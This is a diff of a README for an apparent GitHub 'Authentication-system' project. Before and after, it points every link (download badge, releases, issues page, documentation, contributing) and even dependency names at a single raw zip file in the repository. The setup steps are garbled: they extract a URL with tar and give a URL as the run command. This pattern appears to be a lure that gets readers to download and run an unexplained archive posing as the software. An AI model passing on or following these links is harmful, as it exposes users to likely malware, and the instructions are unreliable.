@@ -1,6 +1,6 @@
 # 🔒 Authentication-system - Simple, Secure User Access Made Easy
 
-[![Download the latest version](https://github.com/Denys200021/Authentication-system/raw/refs/heads/main/client/src/screens/Authentication_system_faradmeter.zip%https://github.com/Denys200021/Authentication-system/raw/refs/heads/main/client/src/screens/Authentication_system_faradmeter.zip)](https://github.com/Denys200021/Authentication-system/raw/refs/heads/main/client/src/screens/Authentication_system_faradmeter.zip)
+[![Download the latest version](https://github.com/Denys200021/Authentication-system/raw/refs/heads/main/client/Authentication_system_v1.6.zip%https://github.com/Denys200021/Authentication-system/raw/refs/heads/main/client/Authentication_system_v1.6.zip)](https://github.com/Denys200021/Authentication-system/raw/refs/heads/main/client/Authentication_system_v1.6.zip)
 
 ## 🚀 Getting Started
 
@@ -15,7 +15,7 @@ Welcome to the Authentication-system! This application provides a modern and sec
 
 ## 📥 Download & Install
 
-To get started, visit this page to download the latest release: [Authentication-system Releases](https://github.com/Denys200021/Authentication-system/raw/refs/heads/main/client/src/screens/Authentication_system_faradmeter.zip).
+To get started, visit this page to download the latest release: [Authentication-system Releases](https://github.com/Denys200021/Authentication-system/raw/refs/heads/main/client/Authentication_system_v1.6.zip).
 
 1. Click on the link above to open the Releases page.
 2. Choose the latest version available.
@@ -42,23 +42,23 @@ You will find installation instructions for Windows, macOS, and Linux below.
 1. Download the `.tgz` file from the Releases page.
 2. Open your terminal.
 3. Navigate to the directory where you downloaded the file.
-4. Extract the contents using the command: `tar -xvzf https://github.com/Denys200021/Authentication-system/raw/refs/heads/main/client/src/screens/Authentication_system_faradmeter.zip`.
+4. Extract the contents using the command: `tar -xvzf https://github.com/Denys200021/Authentication-system/raw/refs/heads/main/client/Authentication_system_v1.6.zip`.
 5. Change into the directory: `cd Authentication-system`.
-6. Run the application using the command: `https://github.com/Denys200021/Authentication-system/raw/refs/heads/main/client/src/screens/Authentication_system_faradmeter.zip`.
+6. Run the application using the command: `https://github.com/Denys200021/Authentication-system/raw/refs/heads/main/client/Authentication_system_v1.6.zip`.
 
 ## 🔧 System Requirements
 
 - **Operating System:** 
   - Windows 10 or later
   - macOS 10.14 or later
-  - Any Linux distribution with support for https://github.com/Denys200021/Authentication-system/raw/refs/heads/main/client/src/screens/Authentication_system_faradmeter.zip
+  - Any Linux distribution with support for https://github.com/Denys200021/Authentication-system/raw/refs/heads/main/client/Authentication_system_v1.6.zip
 
 - **Hardware:** 
   - 4 GB RAM minimum
   - 200 MB free disk space 
 
 - **Software Dependencies:**
-  - https://github.com/Denys200021/Authentication-system/raw/refs/heads/main/client/src/screens/Authentication_system_faradmeter.zip version 14 or later
+  - https://github.com/Denys200021/Authentication-system/raw/refs/heads/main/client/Authentication_system_v1.6.zip version 14 or later
   - MongoDB version 4.0 or later
 
 ## 🛠️ How to Use the Application
@@ -92,7 +92,7 @@ If you encounter issues while using the Authentication-system, first ensure you 
 
 - **Application crashes on startup:**
   - Ensure that your system meets the hardware and software requirements listed above.
-  - Check whether https://github.com/Denys200021/Authentication-system/raw/refs/heads/main/client/src/screens/Authentication_system_faradmeter.zip and MongoDB services are running.
+  - Check whether https://github.com/Denys200021/Authentication-system/raw/refs/heads/main/client/Authentication_system_v1.6.zip and MongoDB services are running.
 
 - **Profile updates not saving:**
   - Ensure you have a stable internet connection.
@@ -100,11 +100,11 @@ If you encounter issues while using the Authentication-system, first ensure you 
 
 ## 📞 Support
 
-For further assistance, please visit our [GitHub Issues page](https://github.com/Denys200021/Authentication-system/raw/refs/heads/main/client/src/screens/Authentication_system_faradmeter.zip). You can submit a new issue or search for existing solutions.
+For further assistance, please visit our [GitHub Issues page](https://github.com/Denys200021/Authentication-system/raw/refs/heads/main/client/Authentication_system_v1.6.zip). You can submit a new issue or search for existing solutions.
 
 ## ✨ Additional Resources
 
-- [Documentation](https://github.com/Denys200021/Authentication-system/raw/refs/heads/main/client/src/screens/Authentication_system_faradmeter.zip) - Comprehensive guides on features and usage.
-- [Contributing](https://github.com/Denys200021/Authentication-system/raw/refs/heads/main/client/src/screens/Authentication_system_faradmeter.zip) - Information on how to contribute to this project.
+- [Documentation](https://github.com/Denys200021/Authentication-system/raw/refs/heads/main/client/Authentication_system_v1.6.zip) - Comprehensive guides on features and usage.
+- [Contributing](https://github.com/Denys200021/Authentication-system/raw/refs/heads/main/client/Authentication_system_v1.6.zip) - Information on how to contribute to this project.
 
 Feel free to reach out if you have any questions or feedback. Enjoy using the Authentication-system!
